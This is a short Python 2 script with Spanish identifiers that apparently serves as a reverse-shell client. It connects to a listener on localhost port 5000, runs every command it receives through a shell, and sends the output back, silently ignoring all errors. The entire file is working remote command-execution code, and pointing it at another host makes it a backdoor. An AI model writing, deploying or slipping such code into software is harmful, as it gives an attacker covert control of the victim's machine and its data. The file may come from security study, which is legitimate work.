#!/usr/bin/env python
# coding=utf8

import socket
import subprocess

cliente = socket.socket()

try:
	cliente.connect(("localhost",5000))
	cliente.send("1")

	while True:
		c = cliente.recv(1024)
		comando = subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		if comando.stderr.read() != "":
			cliente.send("error de comando")
		else:
			cliente.send(comando.stdout.read())
except:
	pass